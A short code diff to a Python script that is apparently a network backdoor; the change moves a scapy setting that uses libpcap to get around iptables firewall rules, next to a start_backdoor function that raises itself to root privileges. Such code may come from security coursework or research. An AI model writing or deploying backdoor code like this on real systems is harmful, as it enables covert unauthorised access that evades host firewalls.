@@ -24,6 +24,9 @@ from scapy.all import *
 from scapy.layers.inet import *
 import encryption
 import subprocess
+# Set scapy to use libpcap library to circumvent iptables rules.
+from scapy.all import conf
+conf.use_pcap = True
 
 LOG_PATH = "log.txt"
 CONFIGURATION_PATH = "configuration.txt"
@@ -141,10 +144,6 @@ def start_backdoor():
     # Elevate privileges.
     setuid(0)
     setgid(0)
-
-    # Set scapy to use libpcap library to circumvent iptables rules.
-    from scapy.all import conf
-    conf.use_pcap = True
 
     # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
